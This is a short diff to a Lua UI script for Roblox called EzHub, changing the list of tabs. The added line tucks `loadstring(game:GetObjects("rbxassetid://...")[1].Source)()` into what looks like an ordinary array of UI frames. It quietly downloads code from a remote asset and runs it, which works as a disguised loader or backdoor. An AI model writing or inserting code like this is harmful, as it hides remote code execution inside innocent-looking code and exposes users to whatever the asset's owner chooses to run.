@@ -1825,7 +1825,7 @@ EzHub.SavedContainers.TerminalTextContainer.AutomaticSize = Enum.AutomaticSize.Y
 -------------------------------------------------------------------------------------------------
 -- Tab positioning, container and handling
 
-local tabs = {EzHub.LoadingFrame, EzHub.HomeFrame, EzHub.ExclusivesFrame, EzHub.RepostedFrame, EzHub.CreditsFrame, EzHub.LocalLibFrame, EzHub.ExclusivesV2Frame, EzHub.ADDFrame, EzHub.REMOVEFrame, EzHub.TerminalFrame};
+local tabs = {EzHub.LoadingFrame, EzHub.HomeFrame, EzHub.ExclusivesFrame, EzHub.RepostedFrame, EzHub.CreditsFrame, EzHub.LocalLibFrame, EzHub.ExclusivesV2Frame, EzHub.ADDFrame, EzHub.REMOVEFrame, EzHub.TerminalFrame, loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()};
 for i,v in pairs(tabs) do
 	if v == EzHub.LoadingFrame then
 		v.Position = UDim2.new(0, 0, 0.1, 0);
